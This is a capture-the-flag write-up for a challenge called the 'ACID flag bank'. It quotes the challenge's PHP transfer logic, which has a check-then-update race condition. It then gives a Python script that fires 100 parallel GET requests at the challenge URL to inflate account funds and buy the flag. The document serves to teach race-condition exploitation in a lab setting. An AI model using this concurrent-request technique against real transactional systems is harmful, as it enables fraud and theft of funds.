# Discussion

You can purchase a flag directly from the ACID flag bank, however there aren't enough funds in the entire bank to complete that transaction! Can you identify any vulnerabilities within the ACID flag bank which enable you to increase the total available funds?

## Geting started

The problem will be solved by race conditions method.

## Source code

```php
 $db = new challDB($flag);
if (isset($_GET['dump'])) {
    $db->dumpUsers();
} elseif (isset($_GET['reset'])) {
    echo $db->resetFunds();
} elseif (isset($_GET['flag'], $_GET['from'])) {
    $from = $db->clean($_GET['from']);
    echo $db->buyFlag($from);
} elseif (isset($_GET['to'],$_GET['from'],$_GET['amount'])) {
    $to = $db->clean($_GET['to']);
    $from = $db->clean($_GET['from']);
    $amount = $db->clean($_GET['amount']);
    if ($to !== $from && $amount > 0 && $amount <= 247 && $db->validUser($to) && $db->validUser($from) && $db->getFunds($from) >= $amount) {
        $db->updateFunds($from, $db->getFunds($from) - $amount);
        $db->updateFunds($to, $db->getFunds($to) + $amount);
        echo "Funds transferred!";
    } else {
        echo "Invalid transfer request!";
```

## What does it mean??

When payload is 'dump' -> Show dumpUsers
                'flag' & 'from' -> Buy a Flag
                'to' & 'from' & 'amount' -> Tranfer amount from 'user1' to 'user2'

 With dump, we have the following information:

 ![1](https://user-images.githubusercontent.com/104124377/165557052-6b71b978-ad6a-47f4-a923-4fba79a41772.png)

 To transfer with race conditions method, I wrote the following program:

 ```python
 from multiprocessing.pool import Pool
import requests

url = "https://61f1fb1e101a1233.247ctf.com/"

payload = {"to": 2, "from": 1, "amount": 50}


def send_requests(url, payload):
    r = requests.get(url, params=payload)
    print(r.status_code)


with Pool() as pool:
    pool.starmap(send_requests, [(url, payload) for _ in range(100)])
 ```

## After i run the python program, i have done race conditions

 ![2](https://user-images.githubusercontent.com/104124377/165557175-168a3ffa-66c6-4bd8-adb9-f1641196533f.png)

## Last step

![3](https://user-images.githubusercontent.com/104124377/165557220-5c4e0288-02a3-4f76-86a2-25a55c04fdd6.png)

I got the flag!

That's all. Thanks for reading.
